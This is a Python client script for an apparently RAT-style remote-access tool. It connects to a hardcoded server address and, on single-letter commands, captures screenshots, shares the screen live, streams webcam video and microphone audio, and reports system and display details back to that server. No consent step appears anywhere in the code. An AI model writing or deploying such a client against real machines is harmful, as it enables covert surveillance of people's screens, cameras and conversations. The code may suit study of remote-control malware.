#!/usr/bin/env python3
import socket 
import sys
import threading
import platform
import webStreamer
import screenViewer
import tkinter as tk

sock = socket.socket()
host = '192.168.0.105'
port = 8080

def connect():
    try:
        sock.connect((host,port))
        print("Connected to server: " + host)
    except:
        print("Failed connecting to server!...")
        sys.exit()

def isCompatible():
    my_OS = platform.system()   
    sock.send(my_OS.encode()) 
    
    #continue running only if client is on Windows or Linux
    if my_OS != "Darwin":
        server_OS = sock.recv(1024).decode() #check server platform 
        if server_OS != "Darwin":
            return True

    return False

def sysFetch():
    #operating system and some minimal kernel inforrmation
    os = platform.platform() 
    sock.send(os.encode())
    s = sock.recv(1024).decode()

    #display
    root = tk.Tk()

    width = root.winfo_screenwidth()
    sock.send(str(width).encode())
    s = sock.recv(1024).decode()

    height = root.winfo_screenheight()
    sock.send(str(height).encode())
    s = sock.recv(1024).decode()

    return width, height

def ControlCenter():
    while True:    
        cmd = sock.recv(1024).decode()
        
        if cmd == "S" or cmd == "s":
            screenViewer.Screenshot(sock).take_screenshot()
        elif cmd == "R" or cmd == "r":
            screenViewer.ShareScreen(sock).sendScreen()
        elif cmd == "W" or cmd == "w":
            webStreamer.VideoStreamer(sock).sendVideo()
        elif cmd == "M" or cmd == "m":
            # this part works only on Windows and Linux (need to check and stop if OS X is used)
            if isCompatible():
                webStreamer.MicStreamer(sock).sendMic()
        elif cmd == "D" or cmd == "d":
            sysFetch()
        else:
            print("\nServer closed - Exiting...")
            sock.close()
            sys.exit()
            break 
   
if __name__ == '__main__':
    connect()
    ControlCenter()
